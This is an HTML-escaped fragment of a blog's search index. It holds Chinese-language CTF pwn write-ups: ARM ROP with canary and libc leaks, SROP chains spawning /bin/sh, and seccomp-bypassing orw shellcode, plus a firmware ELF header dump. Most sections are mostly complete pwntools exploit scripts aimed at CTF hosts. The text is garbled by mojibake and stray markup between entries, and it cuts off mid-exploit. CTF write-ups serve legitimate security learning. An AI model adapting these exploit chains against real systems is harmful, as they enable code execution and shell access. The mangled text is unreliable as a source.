&lt;h3 id=&#34;htb_arms_roped&#34;&gt;htb_arms_roped:&lt;/h3&gt;
&lt;p&gt;Âá∫È¢ò‰∫∫ÁöÑldÂíåüêé‰∏ÄËµ∑Áº∫Â§±‰∫Ü ÔºåsbÈ¢òüòÖüòÖüòÖ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
# remote_addr = [&amp;quot;167.99.82.136&amp;quot;,32375]
remote_addr = [&amp;quot;167.99.85.216&amp;quot;,31954]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    context.log_level=&amp;quot;debug&amp;quot; 
    io = process([&amp;quot;qemu-arm&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./arms_roped&amp;quot;]) 
    elf = ELF(&amp;quot;./arms_roped&amp;quot;)
    # libc = ELF(&amp;quot;./arm-linux-gnueabihf/lib/libc.so.6&amp;quot;)
    # io = process([&amp;quot;qemu-arm&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./rop&amp;quot;]) 
    # io = process(&amp;quot;./rop&amp;quot;)
    context(arch=&#39;arm&#39;,endian=&#39;little&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
    context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context(arch=&#39;arm&#39;,endian=&#39;little&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
        io = remote(remote_addr[0],remote_addr[1])
        elf = ELF(&amp;quot;./arms_roped&amp;quot;)
        # libc = ELF(&amp;quot;./arm-linux-gnueabihf/lib/libc.so.6&amp;quot;)
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

### leak canary
payload=b&amp;quot;a&amp;quot;*0x21
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x21)
canary=u32(io.recv(3)[-4:].rjust(4,b&amp;quot;\x00&amp;quot;))
log.success(&amp;quot;canary: &amp;quot;+hex(canary))


### leak base
payload=b&amp;quot;a&amp;quot;*0x30
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x30)
# base_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))+0x40000000-0x948
base_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))-0x948
log.success(&amp;quot;base_addr: &amp;quot;+hex(base_addr))


### leak libc
payload=b&amp;quot;a&amp;quot;*0x48
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x48)
leak_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))-153-0x1748C
log.success(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

# sys_addr=leak_addr+0x2F5C8 9.9
sys_addr=leak_addr+0x2F510+1  # alignment
### 0002F510

# str_sh=leak_addr+0x0DCE38 9.9
str_sh=leak_addr+0x0DCE0C
### 00DCE0C

log.success(&amp;quot;sys_addr: &amp;quot;+hex(sys_addr))
log.success(&amp;quot;str_sh: &amp;quot;+hex(str_sh))


# 0x000009ec: pop {r4, r5, r6, r7, r8, sb, sl, pc};
# 0x000009d8: mov r0, r7; add r4, r4, #1; blx r3;
# 0x0000056c: pop {r3, pc};

mov_all=base_addr+0x9d8
pop_r4_r5_r6_r7_r8_sb_sl_pc=base_addr+0x9ec
pop_r3_pc=base_addr+0x56c


log.success(&amp;quot;mov_all: &amp;quot;+hex(mov_all))
log.success(&amp;quot;pop_r4_r5_r6_r7_r8_sb_sl_pc: &amp;quot;+hex(pop_r4_r5_r6_r7_r8_sb_sl_pc))
log.success(&amp;quot;pop_r3_pc: &amp;quot;+hex(pop_r3_pc))


payload=cyclic(0x20)+p32(canary)+p32(0xdeadbeef)*3
payload+=p32(pop_r4_r5_r6_r7_r8_sb_sl_pc)

payload+=p32(0)*3
payload+=p32(str_sh) # r7-&amp;gt;str_sh
payload+=p32(0)*3
payload+=p32(pop_r3_pc)

payload+=p32(sys_addr)+p32(mov_all)

io.sendline(payload)

# io.sendline(b&amp;quot;quit&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">ÂºÇÊûÑÂàùÊé¢</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/V0Hk19jqQ/"" data-c="
          &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;‚îÄ[fk@fk]‚îÄ[~/Desktop/cve/1/_US_D301V1.0BR_V1.2.7.8_cn_td.bin.extracted/squashfs-root/bin]
‚îî‚îÄ‚îÄ‚ïº $readelf -h busybox 
ELF Â§¥Ôºö
  MagicÔºö  7f 45 4c 46 01 02 01 00 00 00 00 00 00 00 00 00 
  Á±ªÂà´:                              ELF32
  Êï∞ÊçÆ:                              2 Ë°•Á†ÅÔºåÂ§ßÁ´ØÂ∫è (big endian)
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI ÁâàÊú¨:                          0
  Á±ªÂûã:                              EXEC (ÂèØÊâßË°åÊñá‰ª∂)
  Á≥ªÁªüÊû∂ÊûÑ:                          MIPS R3000
  ÁâàÊú¨:                              0x1
  ÂÖ•Âè£ÁÇπÂú∞ÂùÄÔºö              0x403f90
  Á®ãÂ∫èÂ§¥Ëµ∑ÁÇπÔºö              52 (bytes into file)
  Start of section headers:          0 (bytes into file)
  Ê†áÂøóÔºö             0x50001007, noreorder, pic, cpic, o32, mips32
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         7
  Size of section headers:           0 (bytes)
  Number of section headers:         0
  Section header string table index: 0


&lt;/code&gt;&lt;/pre&gt;
">tenda d301</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/FU4AxD3vB/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWNÔºö&lt;/h3&gt;
&lt;h4 id=&#34;newbottleoldwine&#34;&gt;NewBottleOldWineÔºö&lt;/h4&gt;
&lt;p&gt;riscv64È¢òÁõÆÔºåghidraÁºñËØë‰∏ãËÉΩÊ≠£Â∏∏Áúã‰º™‰ª£Á†ÅÔºå‰ΩÜÊòØÂÖ≥ÈîÆÂ§ÑÊ∂àÂ§±ÔºåÁªìÂêàida64ÂèØ‰ª•ÊâæÂá∫ÂÖ≥ÈîÆ‰ª£Á†Å&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1693471956608.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Á∫¢Ëâ≤ËøôÂù®ghidraÂï•‰πüÊ≤°ÊúâÔºå‰∏çËøáidaÂèçÁºñËØëËøáÂêéÁªìÂêàÂÅèÁßªÂèØÁü•0x11451622Ê≠§Â§ÑÊòØgetshellÁöÑ&lt;/p&gt;
&lt;p&gt;‰∏ÄÂºÄÂßãËØïÂÅèÁßªÔºåÊ≠£Êï∞ÂèëÁé∞Âà∞‰∏ç‰∫ÜÊåáÂÆö‰ΩçÁΩÆÔºå‰∫éÊòØËÄÉËôëÊï¥Êï∞Ê∫¢Âá∫ÔºåÊÖ¢ÊÖ¢ËØïÂÅèÁßªÂèØ‰ª•ËØïÂá∫Êù•&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1693471963171.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ÊúÄÂêéÂÄº‰∏∫-30064770526Êó∂ÂàöÂ•ΩÂèØ‰ª•Ë∑≥ËΩ¨Âà∞0x11451622Êãøshell&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1693471966762.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;riscv&#39;,bits=64)

io=remote(&amp;quot;node6.anna.nssctf.cn&amp;quot;,28016)

payload=b&amp;quot;-30064770526&amp;quot;

io.sendafter(&amp;quot;have?\n&amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;happy2&#34;&gt;happy2&lt;/h4&gt;
&lt;p&gt;Âà©Áî®&lt;code&gt;scanf()&lt;/code&gt;ËæìÂÖ•&lt;code&gt;+-&lt;/code&gt;Âè∑‰∏çË¶ÜÁõñÂÄºÁöÑÁâπÊÄßÔºåÂèØ‰ª•‰ª•Ê≠§Ê≥ÑÈú≤&lt;code&gt;_IO_2_1_stderr_&lt;/code&gt;Âú∞ÂùÄÔºåÁÑ∂ÂêéËæìÂÖ•&lt;code&gt;puts&lt;/code&gt;Âú∞ÂùÄËøõÂÖ•fork()ËøõÁ®ã&lt;br&gt;
ÂºÄÂêØÊ≤ôÁõíÁ¶ÅÁî®&lt;code&gt;read connect fork execveat&lt;/code&gt;&lt;br&gt;
ÂèØ‰ª•Áî®&lt;code&gt;openat+pread+writev&lt;/code&gt;Êâìorw&lt;br&gt;
shellcraftÁöÑopenatÂáΩÊï∞ÊúâÈóÆÈ¢òÔºåËøòÊòØÊâãÂÜôÊØîËæÉÁ®≥&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
# io=remote(&amp;quot;123.249.2.218&amp;quot;,10000)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

io.sendlineafter(b&amp;quot;konw\n&amp;quot;,b&amp;quot;2&amp;quot;)

gdb.attach(io)
pause()

io.sendline(b&amp;quot;+&amp;quot;)
io.sendline(b&amp;quot;+&amp;quot;)
leak_addr=int(io.recvuntil(b&amp;quot;you konw&amp;quot;,drop=True))-libc.sym[b&amp;quot;_IO_2_1_stderr_&amp;quot;]
puts_addr=leak_addr+libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;puts_addr: &amp;quot;,hex(puts_addr))

io.recvuntil(b&amp;quot;now you need to have a try\n&amp;quot;)
io.sendline(str(puts_addr).encode())

payload = asm(&#39;mov rax, 0x67616c66; push rax; mov rdi, 0xffffff9c; mov rsi,rsp; xor rdx,rdx; mov rax,257;syscall;&#39;) #openat flag
# payload = asm(&#39;mov rax, 0x67616c66; push rax; mov rdi,rsp; xor rsi,rsi; xor rdx,rdx; mov rax,2;syscall;&#39;) #open flag
payload += asm(shellcraft.pread(3,0x10500,0x100,0))
payload += asm(shellcraft.writev(1,0x10100,1))
payload = payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+flat(0x10500,0x100)

io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1693472560284.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;misc&#34;&gt;MISCÔºö&lt;/h3&gt;
&lt;h4 id=&#34;gift_in_qrcode&#34;&gt;gift_in_qrcodeÔºö&lt;/h4&gt;
&lt;p&gt;ÊúÄÂºÄÂßãÊú¨Êù•ËØ¥ÁàÜÁ†¥ÔºåÁªìÊûúÁªôÁöÑÂ∞±ÊòØÁ≠îÊ°àÔºåÁôΩÁªô&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1693471973688.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;gift_in_qrcoderevenge&#34;&gt;gift_in_qrcode(revenge):&lt;/h4&gt;
&lt;p&gt;Áü•ÈÅì‰∏Ä‰∏™Ê≠£Á°ÆÁ≠îÊ°àÂ∞±ÂèØ‰ª•ÁàÜÁ†¥‰∫Ü&lt;br&gt;
ÁàÜÁ†¥ËÑöÊú¨Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;)

    
while True:
    try:
        
        io=remote(&amp;quot;node6.anna.nssctf.cn&amp;quot;,28833)

        payload=b&amp;quot;19&amp;quot;

        io.sendlineafter(b&amp;quot;answer:&amp;quot;,payload)

        t=io.recv()
        print(t)
        
        if b&amp;quot;No&amp;quot; in t:
            print(&amp;quot;FAILED&amp;quot;)
            io.close()
        else:
            print(t)
            print(&amp;quot;SUCCEED&amp;quot;)
            sys.exit(0)
        
    except:
        io.close()
        continue
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;magic-docker&#34;&gt;Magic DockerÔºö&lt;/h4&gt;
&lt;p&gt;pull‰∏ãÊù•saveÂà∞Êú¨Âú∞ËøõÂéªÂ∞±Êúâflag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker images #Êü•ÁúãimagesÔºåÊâæÂà∞ÂØπÂ∫îÈïúÂÉèid
docker save $id -o 1.zip #‰ª•1.zipÂΩ¢Âºè‰øùÂ≠òÈïúÂÉèËá≥ÂΩìÂâçÁõÆÂΩï
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1693472029342.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h4 id=&#34;new-terminal&#34;&gt;New TerminalÔºö&lt;/h4&gt;
&lt;p&gt;Áªô‰∫Ü‰∏Ä‰∏™&lt;code&gt;.wasm&lt;/code&gt;Êñá‰ª∂Ôºå‰ΩøÁî®wasmtimeËøêË°å&lt;br&gt;
ÂèØ‰ª•ÂæóÂà∞‰∏Ä‰∏™shell,ÊâßË°å&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat flag|base 64
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂæóÂà∞flagÔºåcyberchef base64‰∏ÄÊääÊ¢≠Âç≥ÂèØ&lt;/p&gt;
">NSS_2nd ÈÉ®ÂàÜwp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/bO-O2aCV6/"" data-c="
          &lt;p&gt;ÂèÇËÄÉ:&lt;br&gt;
&lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/&#34;&gt;link1&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://cjovi.icu/WP/buu-360chunqiu2017_smallest-wp.html&#34;&gt;link2&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;ciscn-2019ÂçéÂçópwn3&#34;&gt;[CISCN 2019ÂçéÂçó]PWN3&lt;/h3&gt;
&lt;p&gt;sropÁöÑÂâçÁΩÆÊù°‰ª∂ÔºåÊú¨È¢òÈÉΩÂèØ‰ª•ÊâæÂà∞&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677349095006.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
‰øùÊä§Âè™ÂºÄ‰∫ÜnxÔºåida stringsÈáåÈù¢‰πüÊòØ‰ªÄ‰πà‰πüÊ≤°Êúâ&lt;br&gt;
Êú¨È¢òÂÖ≥ÈîÆÂáΩÊï∞&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677348479590.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Ê≠§Â§Ñ&lt;code&gt;sys_read&lt;/code&gt;ÂáΩÊï∞ÂèØ‰ª•Â∞ÜËØªÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤‰ªé&lt;code&gt;$rbp-0x10&lt;/code&gt;Â§ÑÂºÄÂßãÂÜôÂÖ•Ê†à‰∏äÔºåÂèØ‰ª•Â∞Ü&lt;code&gt;/bin/sh&lt;/code&gt;ÂÜôÂÖ•Êñπ‰æøÂêéÁª≠Âà©Áî®ÔºåÊâÄ‰ª•payload1ÂèØ‰ª•ËøôÊ†∑ÊûÑÈÄ†&lt;br&gt;
&lt;code&gt;b&amp;quot;/bin/sh\x00&amp;quot;+p64(0)+p64(sys_read)&lt;/code&gt;&lt;br&gt;
ËÄåÈöèÂêéÁöÑ&lt;code&gt;sys_write&lt;/code&gt;ÂàôÂ∞Ü&lt;code&gt;$rbp-0x10&lt;/code&gt;ÂæÄÂêé0x30 bytesÁöÑÊï∞ÊçÆÊâìÂç∞Âá∫Êù•ÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®Ëøô‰∏ÄÁÇπÊ≥ÑÈú≤signal frameÁöÑstack addrÂπ∂ÊµãÁÆóË∑ùÁ¶ª&lt;code&gt;/bin/sh&lt;/code&gt;Â≠óÁ¨¶‰∏≤ÂÅèÁßªÔºåÈÄöËøáÂ∑≤Áü•Âú∞ÂùÄÂÅèÁßªÁ°ÆÂÆö&lt;code&gt;/bin/sh&lt;/code&gt;Â≠óÁ¨¶‰∏≤ÂÖ∑‰Ωì‰ΩçÁΩÆ&lt;br&gt;
gdbÂä®Ë∞ÉÂèØ‰ª•ÊâæÂá∫Êù•ÂÅèÁßª‰∏∫296&amp;lt;=&amp;gt;0x128   (Êú¨Âú∞Ë∞ÉÂá∫Êù•Ëøô‰πàÂ§öËÉΩÊâìÈÄöÔºåËøúÁ´ØÂ∞±Êâì‰∏çÈÄöÔºåËøúÁ´ØÂÅèÁßª0x118ÔºåÊÉÖÂÜµË∑üÊú¨Âú∞ÂèçÁùÄÊù•üòÖüòÖüòÖ)&lt;br&gt;
7/18Êõ¥Êñ∞ÔºöSROPÁöÑÊ†àÂÅèÁßª‰∏çÂêåÁ≥ªÁªüÂÅèÁßª‰∏çÂêå&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677349148648.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÊµãÂá∫ÂÅèÁßªÂêéÂà©Áî®pwntoolsËá™Â∏¶ÂáΩÊï∞&lt;code&gt;SigreturnFrame()&lt;/code&gt;ÂºÄÂßãÊûÑÈÄ†&lt;br&gt;
‰πãÂêéÂõ†‰∏∫ÂâçÈù¢retËøîÂõû&lt;code&gt;vuln&lt;/code&gt;Ëµ∑ÂßãÔºåÈúÄË¶ÅÈáçÊñ∞ËæìÂÖ•Ê∫¢Âá∫ÔºåÂàôpayload2ÂèØ‰ª•ËøôÊ†∑ÊûÑÈÄ†&lt;br&gt;
&lt;code&gt;b&amp;quot;/bin/sh\x00&amp;quot;+p64(0)+p64(mov_rax_0xf)+p64(syscall)+bytes(sigframe)&lt;/code&gt;&lt;br&gt;
ÈöèÂêéget shell&lt;br&gt;
expÂ¶Ç‰∏ãÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
# io=remote(b&amp;quot;node3.anna.nssctf.cn&amp;quot;,28623)

vuln=0x4004ed
syscall=0x400517
mov_rax_0xf=0x4004da

# gdb.attach(io)
# pause()

payload=p64(vuln)*3
io.send(payload)

stack_addr=u64(io.recv()[0x20:0x28])
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))

str_bin_sh=stack_addr-0x118

sigframe=SigreturnFrame()
sigframe.rax=59
sigframe.rdi=str_bin_sh
sigframe.rsi=0
sigframe.rsp=stack_addr
sigframe.rdx=0
sigframe.rip=syscall

payload=b&amp;quot;/bin/sh\x00&amp;quot;+p64(0)+p64(mov_rax_0xf)+p64(syscall)+bytes(sigframe)
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;360chunqiu2017_smallest&#34;&gt;360chunqiu2017_smallest&lt;/h3&gt;
&lt;p&gt;Âè™Êúâ‰∏ÄÊ¨°read_sys,‰ΩÜÊòØÁõ¥Êé•ËØªÂà∞rsp‰∏ä&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1689677310959.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÈúÄË¶ÅÁ¨¨‰∏ÄÊ¨°ËøîÂõûÊó∂‰øÆÊîπ‰Ωé1Â≠óËäÇË∑≥Ëøá&lt;code&gt;xor rax,rax&lt;/code&gt;ÂëΩ‰ª§Ôºå‰ΩøÂæórax‰∏ç‰∏∫0Ôºå‰ªéËÄåÊâßË°åwrite_sysÊ≥ÑÈú≤Ê†àÂú∞ÂùÄÔºåÁ¨¨‰∏âÊ¨°Êó∂ÊûÑÈÄ†readÂæÄÊ†à‰∏äËØªÔºåÊúÄÂêéÊûÑÈÄ†execveÊâßË°åÂç≥ÂèØ&lt;br&gt;
Ê≥®ÊÑèsleepÔºå‰∏çËÉΩÂèëÂ§™Âø´ÔºåÂèëÂ§™Âø´ËøúÁ´Ø‰ºöÁÇ∏&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./smallest&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,28027)

main=0x4000b0
syscall=0x4000be

payload=p64(main)*3
io.send(payload)

# gdb.attach(io)
# pause()

io.send(b&amp;quot;\xb3&amp;quot;)
stack_addr=u64(io.recv()[0x8:0x10])
# stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))


#read
sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_read
sigframe.rdi=0
sigframe.rsi=stack_addr
sigframe.rsp=stack_addr
sigframe.rdx=0x400
sigframe.rip=syscall

payload=p64(main)+p64(0)+bytes(sigframe) #ÂÖ´‰∏™Â≠óËäÇpadding,Âá∫Âéª‰ø°Âè∑Êú∫Âà∂ÁöÑpopÂΩ±Âìç
io.send(payload)

sleep(1)  #ËøúÁ´ØÈò≤ÁÇ∏

payload=p64(syscall)+b&amp;quot;a&amp;quot;*7
io.send(payload)

#execve
sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_execve
sigframe.rdi=stack_addr+0x190
sigframe.rsp=stack_addr
sigframe.rsi=0
sigframe.rdx=0
sigframe.rip=syscall

payload=p64(main)+p64(0)+bytes(sigframe)
payload=payload.ljust(0x190,b&amp;quot;\x00&amp;quot;)+b&amp;quot;/bin/sh\x00&amp;quot;
io.send(payload)

sleep(1)

payload=p64(syscall)+b&amp;quot;a&amp;quot;*7
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;nepctf_srop&#34;&gt;nepctf_srop&lt;/h3&gt;
&lt;p&gt;ÂºÄÂêØÊ≤ôÁõíÔºåorw&lt;br&gt;
Ê≠§È¢òÊ≤°Êúâ&lt;code&gt;syscall;ret&lt;/code&gt;ÁöÑgadgetÔºåÂè™Êúâ&lt;code&gt;syscall()&lt;/code&gt;ÂáΩÊï∞Ôºå&lt;code&gt;syscall()&lt;/code&gt;ÂáΩÊï∞ÂèØ‰ª•ÈÄöËøáÊéßÂà∂&lt;code&gt;$rdi&lt;/code&gt;Êù•ÊéßÂà∂&lt;code&gt;$rax&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;mov     rax, rdi
mov     rdi, rsi
mov     rsi, rdx
mov     rdx, rcx
mov     r10, r8
mov     r8, r9
mov     r9, [rsp+arg_0]
syscall      
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âè™Áªô‰∫Ü‰∏ÄÊ¨°ËØªÂÖ•ÁöÑÊú∫‰ºöÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáËøô‰∏ÄÊ¨°ËØªÂÖ•Ë∞ÉÁî®&lt;code&gt;read&lt;/code&gt;ËØªÂà∞bssÊÆµÂÆûÁé∞Ê†àËøÅÁßª‰∏äÊâìorw&lt;br&gt;
orwÁöÑÂÆûÁé∞ÂùáÁî±&lt;code&gt;syscall()&lt;/code&gt;ÂáΩÊï∞ÂÆûÁé∞&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)

buf_addr=0x601200
syscall=0x4005B0
pop_rdi=0x400813
flag=buf_addr+0x600

io.recvuntil(b&amp;quot;2023!\n&amp;quot;)

#fake stack on bss to read
sigframe=SigreturnFrame()
sigframe.rdi=0 #read Á≥ªÁªüË∞ÉÁî®Âè∑
sigframe.rsi=0 #stdin Ê†áÂáÜËæìÂÖ•
sigframe.rdx=buf_addr #buf
sigframe.rcx=0x800 #size
sigframe.rsp=buf_addr
sigframe.rip=syscall

payload=cyclic(0x38)+p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(sigframe)
io.send(payload)


gdb.attach(io)
pause()


#open
sigframe_open=SigreturnFrame()
sigframe_open.rdi=2 #open Á≥ªÁªüË∞ÉÁî®Âè∑
sigframe_open.rsi=flag #filename
sigframe_open.rdx=0 
sigframe_open.rcx=0
sigframe_open.rsp=buf_addr+0x200 # top addr
sigframe_open.rip=syscall

payload=p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(sigframe_open)
payload=payload.ljust(0x200,b&amp;quot;a&amp;quot;)


#read
sigframe_read=SigreturnFrame()
sigframe_read.rdi=0 #read Á≥ªÁªüË∞ÉÁî®Âè∑
sigframe_read.rsi=3 #fd
sigframe_read.rdx=flag+0x100 #buf
sigframe_read.rcx=0x50 #size
sigframe_read.rsp=buf_addr+0x400 # top addr
sigframe_read.rip=syscall

payload+=p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(sigframe_read)
payload=payload.ljust(0x400,b&amp;quot;a&amp;quot;)

#write
sigframe_write=SigreturnFrame()
sigframe_write.rdi=1 #write Á≥ªÁªüË∞ÉÁî®Âè∑
sigframe_write.rsi=1 #stdout Ê†áÂáÜËæìÂá∫
sigframe_write.rdx=flag+0x100 #buf
sigframe_write.rcx=0x50 #size
sigframe_write.rsp=buf_addr+0x600 # top addr
sigframe_write.rip=syscall

payload+=p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(sigframe_write)
payload=payload.ljust(0x600,b&amp;quot;a&amp;quot;)+b&amp;quot;flag.txt\x00&amp;quot;

io.send(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040080c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040080e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400810 : pop r14 ; pop r15 ; ret
# 0x0000000000400812 : pop r15 ; ret
# 0x000000000040080b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040080f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400628 : pop rbp ; ret
# 0x0000000000400813 : pop rdi ; ret
# 0x0000000000400811 : pop rsi ; pop r15 ; ret
# 0x000000000040080d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040056e : ret
# 0x0000000000400798 : ret 0xbe

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;rootersctf_2019_srop&#34;&gt;rootersctf_2019_srop&lt;/h3&gt;
&lt;p&gt;ÁªôÁöÑ&lt;code&gt;syscall;leave;retn&lt;/code&gt;ÁöÑgadget&lt;br&gt;
‰∏çÁî®leakÂá∫Ê†àÂú∞ÂùÄÔºåÁõ¥Êé•Âú®bssÊÆµ‰∏ä‰º™ÈÄ†Ê†àËØªÂÖ•Â∞±Ë°å‰∫ÜÔºåÊ≥®ÊÑèÊåáÂÆö&lt;code&gt;$rbp&lt;/code&gt;Ôºå‰∏çÁÑ∂ÂèØËÉΩÂç°‰Ωè&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26176)
elf=ELF(&amp;quot;./pwn&amp;quot;)

pop_syscall=0x401032
syscall_leave_ret=0x401033
buf_addr=0x402200
sh_addr=buf_addr+0x200

io.recvuntil(b&amp;quot;CTF?\n&amp;quot;)

sigframe=SigreturnFrame()
sigframe.rax=0
sigframe.rdi=0
sigframe.rsi=buf_addr
sigframe.rdx=0x800
sigframe.rsp=buf_addr
sigframe.rbp=buf_addr
sigframe.rip=syscall_leave_ret

payload=cyclic(0x88)+p64(pop_syscall)+p64(0xf)+bytes(sigframe)
io.send(payload)


# gdb.attach(io)
# pause()


sigframe_exec=SigreturnFrame()
sigframe_exec.rax=59
